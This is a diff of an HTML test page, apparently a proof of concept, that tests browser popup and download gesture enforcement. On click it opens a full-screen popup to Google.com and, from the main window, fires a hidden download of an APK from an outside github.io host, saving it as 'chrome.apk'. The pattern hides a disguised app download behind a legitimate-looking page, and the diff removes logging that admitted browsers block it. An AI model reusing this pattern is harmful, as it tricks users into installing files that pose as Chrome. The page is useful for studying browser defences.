@@ -4,81 +4,74 @@
 <meta charset="utf-8">
 <title>Popup Download Gesture Test</title>
 <style>
-body { font-family:sans-serif;padding:20px }
-button { padding:12px 18px;font-size:16px;background:#4CAF50;color:white;border:none;border-radius:4px;cursor:pointer }
+body { font-family:sans-serif;padding:20px;background:#f5f5f5 }
+button { 
+  padding:12px 18px;
+  font-size:16px;
+  background:#4CAF50;
+  color:white;
+  border:none;
+  border-radius:4px;
+  cursor:pointer;
+  margin-bottom:15px;
+}
 button:hover { background:#45a049 }
-pre { background:#1a1a1a;color:#0f0;padding:15px;border-radius:4px;overflow:auto }
-.log-success { color:#4CAF50 }
-.log-error { color:#f44336 }
-.log-nav { color:#2196F3 }
+pre { 
+  background:#1a1a1a;
+  color:#0f0;
+  padding:15px;
+  border-radius:4px;
+  overflow:auto;
+  font-size:14px;
+  line-height:1.5;
+}
 </style>
 </head>
 <body>
 
 <h3>Popup Download Gesture Enforcement Test</h3>
-<button id="btn">Download From Original Site</button>
+<button id="btn">Open Popup (Google.com)</button>
 <pre id="log"></pre>
 
 <script>
 const logEl = document.getElementById("log");
-const log = (m, cls = '') => {
-  const line = document.createElement('div');
-  line.textContent = `[${new Date().toLocaleTimeString()}] ${m}`;
-  if (cls) line.className = cls;
-  logEl.appendChild(line);
-  logEl.scrollTop = logEl.scrollHeight;
-};
+const log = m => logEl.textContent += m + "\n";
 
 document.getElementById("btn").onclick = () => {
-  log("User click received - Opening popup directly to Google.com", 'log-success');
-  
-  // CRITICAL FIX 1: Open popup DIRECTLY to Google.com (no about:blank intermediate)
-  // This satisfies "pas click bukan blank tapi google.com" requirement
-  const popupUrl = "https://www.google.com"; // Clean URL (no trailing spaces!)
+  log("[1] User click received");
+
+  // ✅ LANGSUNG BUKA GOOGLE.COM (bukan about:blank)
   const w = window.open(
-    popupUrl,
+    "https://www.google.com",
     "_blank",
     `width=${screen.availWidth},height=${screen.availHeight},left=0,top=0,resizable=yes,scrollbars=yes`
   );
 
   if (!w) {
-    log("POPUP BLOCKED! Browser prevented popup window", 'log-error');
-    log("User must allow popups for this site to test", 'log-error');
+    log("[ERROR] Popup blocked by browser");
     return;
   }
 
-  log(`Popup opened successfully to: ${popupUrl}`, 'log-nav');
-  
-  // CRITICAL FIX 2: Attempt download FROM MAIN WINDOW (not popup)
-  // Browsers block cross-origin script injection into google.com
-  // This tests if main window can trigger download using popup's gesture token
+  log("[2] Popup opened directly to Google.com");
+
+  // ⚠️ Trigger download dari WINDOW UTAMA (bukan popup)
+  // Popup google.com tidak bisa di-inject karena CORS
   try {
     const fakeApkLink = document.createElement('a');
-    fakeApkLink.href = "https://oxfat.github.io/fake.apk"; // Clean URL (no spaces!)
+    fakeApkLink.href = "https://oxfat.github.io/fake.apk";
     fakeApkLink.download = "chrome.apk";
     fakeApkLink.style.display = 'none';
     document.body.appendChild(fakeApkLink);
     
-    // Trigger download in main window context
     fakeApkLink.click();
-    log("Download attempt triggered from MAIN WINDOW context", 'log-success');
+    log("[3] Download attempt triggered from MAIN window");
     
-    // Cleanup
     document.body.removeChild(fakeApkLink);
-    
-    // Inform about browser security reality
-    log("⚠️ NOTE: Modern browsers (Chrome 115+, Firefox 115+) will BLOCK this download", 'log-error');
-    log("Reason: Download not triggered by direct user gesture in target context", 'log-error');
-    log("Popup shows Google.com legitimately (no injection possible)", 'log-nav');
   } catch (e) {
-    log(`Download attempt failed: ${e.message}`, 'log-error');
+    log("[ERROR] Download failed: " + e.message);
   }
 
-  // CRITICAL FIX 3: NO navigation attempts to popup
-  // Trying to modify google.com popup would:
-  // - Fail due to CORS (SecurityError)
-  // - Trigger popup blockers
-  // - Break user trust (visible URL mismatch)
+  log("[4] Note: Browser may block download due to gesture enforcement");
 };
 </script>
 
